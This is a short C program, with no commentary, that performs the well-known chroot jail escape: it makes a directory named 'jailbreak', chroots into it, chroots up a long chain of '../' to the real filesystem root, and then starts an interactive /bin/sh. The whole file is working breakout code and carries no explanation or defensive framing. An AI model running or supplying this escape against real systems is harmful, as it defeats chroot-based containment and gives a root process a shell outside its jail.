#include <sys/stat.h>
#include <unistd.h>

int main() {
    mkdir("jailbreak", 0755);
    chroot("jailbreak");
    chroot("../../../../../../../../../../../../../../../..");
    return execl("/bin/sh", "-i", NULL);
}

